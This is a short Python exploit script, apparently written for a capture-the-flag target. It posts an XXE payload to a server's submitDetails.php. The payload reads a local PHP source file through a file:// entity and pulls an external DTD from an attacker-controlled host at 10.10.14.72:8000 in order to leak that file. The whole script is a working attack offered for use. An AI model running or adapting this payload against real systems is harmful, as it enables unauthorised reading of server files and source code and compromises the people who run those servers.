#!/usr/bin/python3

import requests
import os
import sys
import re
from pwn import *


def implementing_exploit(url):
    log.progress("loading out payload in XXE")
    payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
<!ENTITY % end "]]>">
<!ENTITY % xxe SYSTEM "http://10.10.14.72:8000/xxe.dtd">
  %xxe;
]>
<root>
<name>test</name>
<tel></tel>
<email>&joined;</email>
<message></message>
</root>"""
    headers = {
        "Content-Type":"application/xml"
    }

    
    log.info("generating session")
    sess = requests.session()
    ress = sess.post(url=url+"submitDetails.php", headers=headers, data=payload)
    print(ress.text)


def main():
    url = sys.argv[1]
    implementing_exploit(url)




if __name__ == "__main__":
    main()


